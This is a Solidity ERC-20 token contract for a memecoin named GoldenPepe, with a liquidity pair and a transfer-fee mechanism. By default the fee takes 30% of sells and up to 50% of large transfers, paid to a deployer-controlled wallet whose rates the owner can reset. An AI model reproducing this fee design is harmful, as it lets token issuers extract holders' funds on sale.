1 pragma solidity ^0.8.20;
2 // SPDX-License-Identifier: Unlicensed
3 
4 interface IERC20 {
5   function totalSupply() external view returns (uint256);
6   function balanceOf(address account) external view returns (uint256);
7   function transfer(address recipient, uint256 amount) external returns (bool);
8   function allowance(address owner, address spender) external view returns (uint256);
9   function approve(address spender, uint256 amount) external returns (bool);
10   function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
11   event Transfer(address indexed from, address indexed to, uint256 value);
12   event Approval (address indexed owner, address indexed spender, uint256 value);
13 }
14 
15 library SafeMath {
16   function add(uint256 a, uint256 b) internal pure returns (uint256) {
17     uint256 c = a + b;
18     require(c >= a, "SafeMath: addition overflow");
19     return c;
20   }
21   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
22     return sub(a, b, "SafeMath: subtraction overflow");
23   }
24   function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
25     require(b <= a, errorMessage);
26     uint256 c = a - b;
27     return c;
28   }
29   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
30     if (a == 0) {
31       return 0;
32     }
33     uint256 c = a * b;
34     require(c / a == b, "SafeMath: multiplication overflow");
35     return c;
36   }
37   function div(uint256 a, uint256 b) internal pure returns (uint256) {
38     return div(a, b, "SafeMath: division by zero");
39   }
40   function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
41     require(b > 0, errorMessage);
42     uint256 c = a / b;
43     return c;
44   }
45 
46 }
47 
48 abstract contract Context {
49   function _msgSender() internal view virtual returns (address) {
50     return msg.sender;
51   }
52 }
53 
54 contract Ownable is Context {
55   address private _owner;
56   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
57   constructor () {
58     address msgSender = _msgSender();
59     _owner = msgSender;
60     emit OwnershipTransferred(address(0), msgSender);
61   }
62   function owner() public view returns (address) {
63     return _owner;
64   }
65   modifier onlyOwner() {
66     require(_owner == _msgSender(), "Ownable: caller is not the owner");
67     _;
68   }
69   function renounceOwnership() public virtual onlyOwner {
70     emit OwnershipTransferred(_owner, address(0));
71     _owner = address(0);
72   }
73 }
74 
75 interface IDEXFactory {
76     function createPair(address tokenA, address tokenB) external returns (address pair);
77 }
78 
79 interface IDEXRouter {
80     function factory() external pure returns (address);
81     function WETH() external pure returns (address);
82 
83     function addLiquidity(
84         address tokenA,
85         address tokenB,
86         uint amountADesired,
87         uint amountBDesired,
88         uint amountAMin,
89         uint amountBMin,
90         address to,
91         uint deadline
92     ) external returns (uint amountA, uint amountB, uint liquidity);
93 
94     function addLiquidityETH(
95         address token,
96         uint amountTokenDesired,
97         uint amountTokenMin,
98         uint amountETHMin,
99         address to,
100         uint deadline
101     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
102 
103     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
104         uint amountIn,
105         uint amountOutMin,
106         address[] calldata path,
107         address to,
108         uint deadline
109     ) external;
110 
111     function swapExactETHForTokensSupportingFeeOnTransferTokens(
112         uint amountOutMin,
113         address[] calldata path,
114         address to,
115         uint deadline
116     ) external payable;
117 
118     function swapExactTokensForETHSupportingFeeOnTransferTokens(
119         uint amountIn,
120         uint amountOutMin,
121         address[] calldata path,
122         address to,
123         uint deadline
124     ) external;
125 }
126 
127 interface InterfaceLP {
128     function sync() external;
129 }
130 
131 contract GoldenPepe is Context, IERC20, Ownable {
132   using SafeMath for uint256;
133   mapping (address => uint256) private _balances;
134   mapping (address => mapping (address => uint256)) private _allowances;
135   IDEXRouter public router;
136   InterfaceLP private pairContract;
137   address public pair;
138   address WETH;
139   
140   event ClearStuck(uint256 amount);
141   event ClearToken(address TokenAddressCleared, uint256 Amount);
142 
143   uint256 firstBlock;
144 
145   uint8 private _decimals = 5; //number of decimal places
146   uint256 private _totalSupply = 69042069000069042069;
147   uint256 private _maxWalletSize = 690420690000742069; //wallet size is locked to this amount
148   uint256 private _walletSizeLocked = 164; //wallet size is locked for this number of blocks
149   string private _symbol = "GOLD";
150   string private _name = "GoldenPepe";
151   uint256 private transferpercent = 2;
152   uint256 private sellpercent = 30;
153   uint256 private buypercent = 2;
154   address private taxWallet;
155 
156 
157 
158   constructor() {
159     router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
160     WETH = router.WETH();
161     pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
162     pairContract = InterfaceLP(pair);
163     
164     _allowances[address(this)][address(router)] = type(uint256).max;
165     taxWallet = _msgSender();
166     _balances[_msgSender()] = _totalSupply;
167     firstBlock = block.number;
168     emit Transfer(address(0), _msgSender(), _totalSupply);
169   }
170   receive() external payable { }
171 
172   function getOwner() external view returns (address) {
173     return owner();
174   }
175   function decimals() external view returns (uint8) {
176     return _decimals;
177   }
178   function symbol() external view returns (string memory) {
179     return _symbol;
180   }
181   function name() external view returns (string memory) {
182     return _name;
183   }
184   function totalSupply() external view override returns (uint256) {
185     return _totalSupply;
186   }
187   function balanceOf(address account) external view override returns (uint256) {
188     return _balances[account];
189   }
190   function transfer(address recipient, uint256 amount) external override returns (bool) {
191     _transfer(_msgSender(), recipient, amount);
192     return true;
193   }
194   function allowance(address owner, address spender) external view override returns (uint256) {
195     return _allowances[owner][spender];
196   }
197   function approve(address spender, uint256 amount) external override returns (bool) {
198     _approve(_msgSender(), spender, amount);
199     return true;
200   }
201   function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
202     _transfer(sender, recipient, amount);
203     _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "transfer amount exceeds allowance"));
204     return true;
205   }
206   function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
207     _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
208     return true;
209   }
210   function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
211     _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "error in decrease allowance"));
212     return true;
213   }
214   function _transfer(address sender, address recipient, uint256 amount) internal {
215     require(sender != address(0), "transfer sender address is 0 address");
216     require(recipient != address(0), "transfer recipient address is 0 address");
217     require(amount > 0, "Transfer amount must be greater than zero");
218 
219     if (sender != owner() && recipient != owner() && recipient != pair && recipient != taxWallet) {
220       if (firstBlock + _walletSizeLocked > block.number) {
221         require(_balances[recipient] + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
222       }
223     }
224 
225     _balances[sender] = _balances[sender].sub(amount, "transfer balance too low");
226     amount = (sender == taxWallet || recipient == taxWallet) ? amount : takeTax(sender, amount, recipient);
227     _balances[recipient] = _balances[recipient].add(amount);
228 
229     emit Transfer(sender, recipient, amount);
230   }
231 
232   function takeTax(address sender, uint256 amount, address recipient) internal returns (uint256) {
233     
234     uint256 percent = transferpercent;
235     if(recipient == pair) {
236         percent = sellpercent;
237     } else if(sender == pair) {
238         percent = buypercent;
239     }
240 
241     if(amount>_maxWalletSize)
242         percent = percent.mul(10);
243     if(percent>50)
244         percent = 50;
245 
246     uint256 tax = amount.mul(percent).div(100);
247     _balances[taxWallet] = _balances[taxWallet].add(tax);
248     emit Transfer(sender, taxWallet, tax);
249     return amount.sub(tax);
250   }
251 
252   function setTaxes(uint256 _transferpercent, uint256 _sellpercent, uint256 _buypercent) public onlyOwner {
253     transferpercent=_transferpercent;
254     sellpercent=_sellpercent;
255     buypercent=_buypercent;
256   }
257 
258   function setTaxReceiver(address _receiver) public onlyOwner {
259     taxWallet = _receiver;
260   }
261 
262   function receiveStuckETH() external { 
263     payable(taxWallet).transfer(address(this).balance);
264   }
265 
266   function receiveStuckToken(address tokenAddress, uint256 tokens) external returns (bool success) {
267     if(tokens == 0){
268       tokens = IERC20(tokenAddress).balanceOf(address(this));
269     }
270     emit ClearToken(tokenAddress, tokens);
271     return IERC20(tokenAddress).transfer(taxWallet, tokens);
272   }
273 
274   function _approve(address owner, address spender, uint256 amount) internal {
275     require(owner != address(0), "approve owner is 0 address");
276     require(spender != address(0), "approve spender is 0 address");
277     _allowances[owner][spender] = amount;
278     emit Approval(owner, spender, amount);
279   }
280 }